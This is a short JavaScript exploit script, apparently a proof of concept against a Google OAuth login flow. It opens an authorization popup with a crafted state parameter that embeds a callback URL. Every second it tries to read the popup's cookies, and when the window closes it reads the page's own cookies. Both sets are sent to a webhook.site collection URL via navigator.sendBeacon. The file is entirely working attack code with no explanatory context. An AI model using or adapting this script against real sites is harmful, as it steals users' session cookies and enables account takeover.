let exploitWindow = window.open(
    'https://accounts.google.com/o/oauth2/auth?redirect_uri=https://example.com/auth/google/callback&response_type=code&scope=email&client_id=0000000000-0000000.apps.googleusercontent.com&state={"app":"bla-bla","redirect":"https://www.example.com/landingpage","":"undefined","callback":"https://clb.example.com/auth/google/callback"}&nonce=00000',
    "example",
    "width=600,height=400,status=yes,scrollbars=yes,resizable=yes"
);

var checkClosed = setInterval(function() {
    try {
        navigator.sendBeacon('https://webhook.site/308eb196-9618-447d-a2f6-d2e2e1e3d534', JSON.stringify({
            cookiex: exploitWindow.document?.cookie || "n/a",
            time: new Date().toISOString()
        }));
    } catch (e) {}

    if (exploitWindow.closed) {
        clearInterval(checkClosed);
        var cookies = document.cookie;
        alert(cookies);
        console.log(cookies);
        navigator.sendBeacon('https://webhook.site/308eb196-9618-447d-a2f6-d2e2e1e3d534', JSON.stringify({
            cookie: cookies,
            closed: true,
            time: new Date().toISOString()
        }));
    }
}, 1000);
